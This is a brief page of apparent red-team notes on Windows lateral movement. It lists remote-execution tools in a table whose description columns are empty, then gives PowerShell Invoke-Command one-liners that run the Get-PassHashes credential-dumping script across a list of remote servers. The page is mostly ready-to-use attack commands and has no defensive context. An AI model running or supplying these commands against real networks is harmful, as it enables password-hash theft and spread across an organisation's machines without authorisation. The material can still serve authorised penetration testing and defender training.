# 🥰 Tools to Lateral Movement

| Tool            | Description | Noise |
| --------------- | ----------- | ----- |
| Enter-PSSession |             |       |
| Invoke-Command  |             |       |
| psexec.exe      |             |       |
| wmis            |             |       |
| wmic            |             |       |
| winrs           |             |       |
| RDP             |             |       |

<figure><img src="../.gitbook/assets/Table1.png" alt=""><figcaption></figcaption></figure>

### Powershell Remoting

{% code overflow="wrap" fullWidth="true" %}
```powershell
Invoke-Command -Scriptblock {Get-Process} -ComputerName (Get-Content <list_of_servers>)
```
{% endcode %}

{% code overflow="wrap" fullWidth="true" %}
```
Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)
```
{% endcode %}

{% code overflow="wrap" fullWidth="true" %}
```powershell
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>)
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>) -ArgumentList
```
{% endcode %}

{% code title="" overflow="wrap" fullWidth="true" %}
```powershell
Invoke-Command -Filepath C:\path\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)
```
{% endcode %}
